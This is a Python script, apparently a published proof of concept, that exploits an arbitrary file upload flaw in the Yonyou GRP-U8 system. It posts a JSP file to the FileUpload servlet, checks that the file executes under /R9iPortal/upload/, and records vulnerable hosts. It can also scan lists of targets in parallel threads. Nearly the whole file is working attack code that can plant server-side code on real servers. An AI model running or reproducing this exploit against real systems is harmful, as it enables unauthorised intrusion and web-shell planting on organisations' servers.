import argparse
import requests
import random
import concurrent.futures
import sys

def poc(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=-----------------------------32840991842344344364451981273'
    }
    data = """<% out.println("xhs");%>"""

    vulnurl = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"
    okurl = url + "/R9iPortal/upload/1.jsp"
    try:
        # 发送 POST 请求
        r = requests.post(vulnurl, headers=headers, data=data, verify=False, timeout=5)
        if r.status_code == 200:
            if 'xhs' in requests.get(okurl, headers=headers).text:
                print('\033[1;31m' + '[+] Success ' + okurl + '\033[0m')
                with open('results.txt', 'a') as f:
                    f.write(okurl + '\n')
            else:
                print('[-] Failed')
        else:
            print('[-] Failed')
    except requests.exceptions.RequestException as e:
        print(f"连接失败: {e}")
def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """                      ___
  __ ____ ________ __( _ )
 / // / // /___/ // / _  |
 \_, /\_, /    \_,_/\___/
/___//___/

"""
    print(helpinfo)
    print("YYGRP-U8".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))


def main():
    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        poc(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(poc, urls)
    else:
        help()
if __name__ == '__main__':
    main()
